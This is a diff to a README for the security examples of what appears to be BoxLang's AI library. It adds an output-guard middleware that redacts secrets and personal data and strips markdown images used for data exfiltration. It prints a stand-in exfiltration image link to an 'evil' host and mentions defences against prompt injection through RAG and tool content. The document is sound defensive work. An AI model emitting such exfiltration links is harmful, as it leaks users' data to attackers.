@@ -18,6 +18,7 @@ boxlang security/01-input-sanitizer.bxs
 | `04-fencing-untrusted-content.bxs`| `aiFence()` to spotlight hostile RAG/tool content as DATA; boundary-forgery neutralization; inline security preamble |
 | `05-rag-context-fencing.bxs`     | `aiMessage().addUntrusted()`, `setContextTrust(false)`, and global `security.fencing.enabled` for the `${context}` path |
 | `06-llm-judge.bxs`               | `LLMGuardMiddleware` — a second (cheap/local) model judges input for injection/harm before the main call; SAFE allows, INJECTION blocks |
+| `07-output-guard.bxs`            | `OutputGuardMiddleware` — scrubs the **response**: redacts secrets/PII (email, SSN, credit card w/ Luhn, API keys, private keys, JWT) and strips data-exfil markdown images; actions redact/flag/block |
 
 ## The layers
 
@@ -63,6 +64,13 @@ boxlang security/01-input-sanitizer.bxs
    novel attacks patterns miss. Attach on an agent/model; blocks by throwing
    `BXAI.SecurityViolation`. Fail-open by default, fenced judge input, recursion-guarded,
    verdict-cached.
+
+5. **Output guard (middleware)** — `OutputGuardMiddleware` scrubs the model's
+   **response** before it reaches your app/user: it **redacts** secrets/PII (email,
+   SSN, credit card with a Luhn check, AWS keys, private-key blocks, JWTs, generic API
+   tokens) and **strips** data-exfiltration markdown images (`![x](https://evil/?d=…)`),
+   with a host allowlist. 100% offline. Actions: `redact` (default) / `flag` / `block`.
+   Attach on an agent/model. Works on streaming across all providers.
 
 ## Rollout recipe
 
